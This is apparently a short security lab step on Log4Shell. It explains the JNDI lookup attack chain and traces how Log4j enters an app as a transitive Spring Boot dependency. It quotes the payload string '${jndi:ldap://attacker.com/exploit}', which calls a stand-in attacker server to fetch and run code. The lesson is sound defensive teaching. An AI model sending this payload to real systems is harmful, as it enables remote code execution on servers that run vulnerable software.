The Log4Shell vulnerability exploits Java's JNDI (Java Naming and
Directory Interface) lookup feature built into Log4j's message
formatting. When Log4j encounters `${jndi:ldap://...}` in any
logged string, it performs a network lookup to the specified server.

The attack chain:
1. Attacker sends `${jndi:ldap://attacker.com/exploit}` in any
   user-controlled input that gets logged (HTTP headers, form fields,
   User-Agent, etc.)
2. Log4j's message formatter resolves the JNDI expression
3. The JVM connects to the attacker's LDAP server
4. The LDAP server returns a reference to a malicious Java class
5. The JVM downloads and executes the class -- full RCE

The supply chain angle: most organizations did not know they used
Log4j because it was a transitive dependency. Your app uses Spring
Boot, which uses spring-boot-starter-logging, which uses log4j-core.

Examine the dependency tree:

```bash
cat /app/dependency-tree.txt
```

Generate an SBOM and find the Log4j path:

```bash
cat /app/pom.xml
```
